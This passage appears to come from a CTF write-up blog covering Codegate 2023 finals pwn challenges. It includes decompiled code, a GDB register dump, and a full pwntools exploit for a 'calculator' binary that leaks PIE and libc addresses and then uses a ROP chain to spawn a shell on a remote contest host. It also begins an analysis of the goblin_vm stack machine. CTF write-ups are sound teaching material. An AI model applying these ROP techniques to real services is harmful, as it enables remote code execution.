</span></span><span style="display:flex;"><span>              local_50 <span style="color:#f92672">=</span> local_988[operandTop];
</span></span><span style="display:flex;"><span>              operandTop <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>              local_58 <span style="color:#f92672">=</span> local_988[iVar1];
</span></span><span style="display:flex;"><span>              operatorTop <span style="color:#f92672">=</span> operatorTop <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>              local_60 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calculate</span>(local_58,local_50,(<span style="color:#66d9ef">int</span>)local_188[lVar5],local_50);
</span></span><span style="display:flex;"><span>              operandTop <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>              local_988[operandTop] <span style="color:#f92672">=</span> local_60;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            operatorTop <span style="color:#f92672">=</span> operatorTop <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>            local_188[operatorTop] <span style="color:#f92672">=</span> local_41;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      local_20 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ((uVar6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SEXT48</span>(i), sVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(expression), uVar6 <span style="color:#f92672">&lt;</span> sVar4 <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>             (ppuVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__ctype_b_loc</span>(), ((<span style="color:#f92672">*</span>ppuVar3)[(<span style="color:#66d9ef">char</span>)expression[i]] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x800</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>))) {
</span></span><span style="display:flex;"><span>        local_20 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)((<span style="color:#66d9ef">char</span>)expression[i] <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">+</span> local_20 <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>        i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      operandTop <span style="color:#f92672">=</span> operandTop <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      local_988[operandTop] <span style="color:#f92672">=</span> local_20;
</span></span><span style="display:flex;"><span>      i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span>( true );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</details></p>

<p>I actually didn&rsquo;t fully reverse the evaluateExpression function as it was dense.
I saw that it called __ctype_b_loc(), and assumed that it checked if the char in the expression was a digit or a symbol.
I went to test this out by typing <code>A-1</code> in the calculator, and a large number was outputted.
I turned the number to hex and it was a PIE leak.</p>
<p>Glad I didn&rsquo;t have to reverse the evaluateExpression function :))</p>
<p>I then tried to find a <code>pop rdi; ret</code> gadget in the binary to pop a GOT address into rdi and then just ret to puts@plt to leak libc, but no such gadget was found. I then breakpointed at the ret instruction inside note() to see what the registers are like when we control ret, and</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>[ Legend: Modified register | Code | Heap | Stack | String ]
</span></span><span style="display:flex;"><span>‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ registers ‚îÄ‚îÄ‚îÄ‚îÄ
</span></span><span style="display:flex;"><span>$rax   : 0x37
</span></span><span style="display:flex;"><span>$rbx   : 0x0
</span></span><span style="display:flex;"><span>$rcx   : 0x00007ffff7ea7a37  ‚Üí  0x5177fffff0003d48 (&#34;H=&#34;?)
</span></span><span style="display:flex;"><span>$rdx   : 0x0
</span></span><span style="display:flex;"><span>$rsp   : 0x00007fffffffe2d8  ‚Üí  &#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&#34;
</span></span><span style="display:flex;"><span>$rbp   : 0x4141414141414141 (&#34;AAAAAAAA&#34;?)
</span></span><span style="display:flex;"><span>$rsi   : 0x00007fffffffc180  ‚Üí  &#34;Notepad: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&#34;
</span></span><span style="display:flex;"><span>$rdi   : 0x00007fffffffc060  ‚Üí  0x00007ffff7df50d0  ‚Üí  &lt;funlockfile+0&gt; endbr64
</span></span><span style="display:flex;"><span>$rip   : 0x0000555555555ac9  ‚Üí  &lt;note+174&gt; ret
</span></span><span style="display:flex;"><span>$r8    : 0x37
</span></span><span style="display:flex;"><span>$r9    : 0x7fffffff
</span></span><span style="display:flex;"><span>$r10   : 0x0
</span></span><span style="display:flex;"><span>$r11   : 0x246
</span></span><span style="display:flex;"><span>$r12   : 0x00007fffffffe408  ‚Üí  0x00007fffffffe66e  ‚Üí  &#34;/home/vagrant/ctf/finals_codegate23/calculator/cal[...]&#34;
</span></span><span style="display:flex;"><span>$r13   : 0x0000555555555b58  ‚Üí  &lt;main+0&gt; endbr64
</span></span><span style="display:flex;"><span>$r14   : 0x0000555555557d78  ‚Üí  0x0000555555555220  ‚Üí  &lt;__do_global_dtors_aux+0&gt; endbr64
</span></span><span style="display:flex;"><span>$r15   : 0x00007ffff7ffd040  ‚Üí  0x00007ffff7ffe2e0  ‚Üí  0x0000555555554000  ‚Üí   jg 0x555555554047
</span></span><span style="display:flex;"><span>$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
</span></span><span style="display:flex;"><span>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
</span></span></code></pre></div><p>rdi is already pointing to a libc address.</p>
<p>So I just ret to puts@plt to leak libc, and then ret back to _start (entry point) to restart the program, and then just ret2libc.</p>


<p><details >
  <summary markdown="span"><strong>exploit.py</strong></summary>
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io = process(&#34;./calc&#34;)</span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.125.200.127&#34;</span>,<span style="color:#ae81ff">8888</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;command&gt;&#34;</span>,<span style="color:#e6db74">&#34;calc&#34;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Formula&gt;&#34;</span>,<span style="color:#e6db74">&#34;A&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Result&gt; &#34;</span>)
</span></span><span style="display:flex;"><span>pieBase <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">5951</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;PIE BASE: &#34;</span> <span style="color:#f92672">+</span> hex(pieBase))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>putsPlt <span style="color:#f92672">=</span> p64(pieBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10e0</span>)
</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> p64(pieBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1180</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">56</span> <span style="color:#f92672">+</span> putsPlt <span style="color:#f92672">+</span> entry
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;command&gt;&#34;</span>,<span style="color:#e6db74">&#34;note&#34;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Note&gt;&#34;</span>,rop)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;funlockfile&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>popRdi <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a3e5</span>)
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(pieBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1be9</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">56</span> <span style="color:#f92672">+</span> ret <span style="color:#f92672">+</span> popRdi <span style="color:#f92672">+</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))) <span style="color:#f92672">+</span> p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;system&#34;</span>])
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;command&gt;&#34;</span>,<span style="color:#e6db74">&#34;note&#34;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Note&gt;&#34;</span>,rop2)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div>
</details></p>

<p>I actually managed to get first blood for this chall, and for the whole pwn category, which is my first ever <strong>first blood ü©∏!</strong></p>
<p><img loading="lazy" src="/codegate23/firstblood.png" alt="first ever first blood ü©∏"  />
</p>
<h2 id="goblin_vm-pwn">goblin_vm (pwn)<a hidden class="anchor" aria-hidden="true" href="#goblin_vm-pwn">#</a></h2>
<p><strong>checksec</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span></code></pre></div>

<p><details >
  <summary markdown="span"><strong>src.c</strong></summary>
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> bVar1;
</span></span><span style="display:flex;"><span>  undefined isLargeRoom;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>untilSpaceStr;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  undefined4 local_828;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> instr;
</span></span><span style="display:flex;"><span>  undefined4 <span style="color:#f92672">*</span>mallocChunk;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> code [<span style="color:#ae81ff">2056</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setup</span>();
</span></span><span style="display:flex;"><span>  isLargeRoom <span style="color:#f92672">=</span> <span style="color:#a6e22e">askRoom</span>();
</span></span><span style="display:flex;"><span>  room <span style="color:#f92672">=</span> <span style="color:#a6e22e">giveRoom</span>(isLargeRoom);
</span></span><span style="display:flex;"><span>  bVar1 <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>  local_828 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  mallocChunk <span style="color:#f92672">=</span> (undefined4 <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>mallocChunk <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(code,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x800</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getInput</span>(code);
</span></span><span style="display:flex;"><span>    untilSpaceStr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>(code,<span style="color:#e6db74">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>    instr <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(untilSpaceStr);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>(instr) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr1</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr2</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr3</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr4</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr5</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr6</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">7</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr7</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr8</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">9</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr9</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">instr10</span>(mallocChunk,<span style="color:#f92672">&amp;</span>local_828,<span style="color:#f92672">&amp;</span>local_828);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xb</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      bVar1 <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!</span>bVar1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">askRoom</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> sVar1;
</span></span><span style="display:flex;"><span>  undefined8 uVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_118 [<span style="color:#ae81ff">264</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Hi, Do you want a large room? [y/N]&#34;</span>);
</span></span><span style="display:flex;"><span>  sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,local_118,<span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (sVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((local_118[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span>) <span style="color:#f92672">||</span> (local_118[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Y&#39;</span>)) {
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">!=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__stack_chk_fail</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> uVar2;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">long</span> <span style="color:#a6e22e">giveRoom</span>(<span style="color:#66d9ef">char</span> param_1){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pvVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> local_18;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (param_1 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>) {
</span></span><span style="display:flex;"><span>    local_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x100000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    local_18 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400000</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  pvVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(local_18,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">long</span>)pvVar1 <span style="color:#f92672">+</span> (local_18 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
</details></p>

<p>The binary is an implementation of the classic stack machine.</p>
<p>It first asks if you would want a large room (room here is refering to the vm&rsquo;s stack/memory), and will calloc(0x400000) if you answer &lsquo;Y&rsquo;, and calloc(0x100000) if you answer anything else. Since the malloc request sizes are so large, the chunk is actually not allocated at the heap, but instead fulfilled using mmap(), having the memory map being allocated right above libc. This means that the room/vm&rsquo;s stack is right above libc.</p>
<p>It then asks for instructions in a while loop, expecting input in the form of: <code>opcode arg</code>.<br>
So for example: <code>1 9</code></p>
<p>Let&rsquo;s look at what the instructions actually do:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr1</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// push reg onto stack
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  room <span style="color:#f92672">=</span> (room <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>room <span style="color:#f92672">=</span> reg;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr2</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// pop value on top of stack into reg 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  reg <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>room; <span style="color:#75715e">// qword
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  room <span style="color:#f92672">=</span> room <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// ptr addition, so actually + 8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr3</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// reg++
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  reg <span style="color:#f92672">=</span> reg <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// actually add 1
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr4</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// reg--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  reg <span style="color:#f92672">=</span> reg <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">instr5</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 5 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// reg += 123
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  __nptr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>(<span style="color:#ae81ff">0x0</span>,<span style="color:#e6db74">&#34; &#34;</span>);
</span></span><span style="display:flex;"><span>  lVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoll</span>(__nptr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  reg <span style="color:#f92672">=</span> reg <span style="color:#f92672">+</span> lVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
